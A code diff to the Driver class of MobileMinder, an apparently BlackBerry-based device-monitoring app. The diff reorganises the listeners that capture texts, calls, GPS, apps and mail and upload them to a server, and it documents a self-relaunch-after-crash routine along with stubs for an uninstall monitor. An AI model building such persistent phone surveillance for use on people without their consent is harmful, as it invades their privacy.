@@ -124,9 +124,7 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
     	invokeLater(new Runnable()
     	{
     		public void run()
-    		{
-    			
-    			
+    		{				
     			///////////////    			
     			// Wait for SD Card to be mounted
 				try {
@@ -136,6 +134,7 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
 						logWriter.log("Driver::Waiting on SD card to be mounted...");
 						Thread.sleep(1000*6);//6 seconds
 					}
+					logWriter.log("Driver::doStartupWorkLater:run");
 				} 
 				catch (InterruptedException e)
 				{
@@ -146,6 +145,8 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
 				logWriter.log("After SD card wait thread. sdCardMounted="+(sdCardMounted?"true":"false"));
 				
 				//Setup registration
+				//TODO: Should this be in a thread? Is this thread running more than once?
+				//Can we put this outside the thread?
     			Reg = new Registration(actLog);
     			
     	    	try//wait here till Reg is OK = OK to send ;) 
@@ -177,6 +178,14 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         actLog = LocalDataAccess.getLocalDataAccessRef();
         logWriter.log("MobileMinder::Driver->Start...");
         
+        //Hear[] subscribers;
+    	//subscribers = new Hear[2];
+    	Controllable[] components;
+    	components = new Controllable[5];
+    	
+    	//subscribers[0] = new UninstallMonitor(context, actLog);
+
+        
         // For future "Registration" feature 
         //int employerID  = 1;
         //int deviceID    = 2;
@@ -190,15 +199,22 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         // Load sub-components
         // new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
 
+        components[0] = new MyTextListener(actLog);
+        //WebMonitor wm = new WebMonitor (context, actLog);
+    	//components[1] = wm;
+        components[2] = new MyCallListener(actLog);        
+    	//components[3] = new ContactPic(context, actLog);
+    	//components[4] = new MediaSync(context, actLog);        
         new MyGPSListener (actLog, GPSTimer);
         new MyAppListener (actLog, AppTimer);            
         new MyMailListener(actLog);
-        new MyTextListener(actLog);
-        new MyCallListener(actLog);        
     	// Start up connection to the server
     	new Server(actLog).start();
     }
     
+    /**
+     * Called when the system powers up for the first time.
+     */
 	public void powerUp()
     {
 	    logWriter.log("Power up...");
@@ -255,6 +271,10 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
     	logWriter.log("usbConnectionStateChanged..."+arg0);
 	}
 	
+	/**
+	 * Attempts to launch app if it crashed. This method is called from the BacklightStateChange() method.
+	 * This can be skipped by removing the SystemListener in PowerUp()
+ 	 */
 	private void launchApplication()
 	{
 		logWriter.log("In launchApplication");
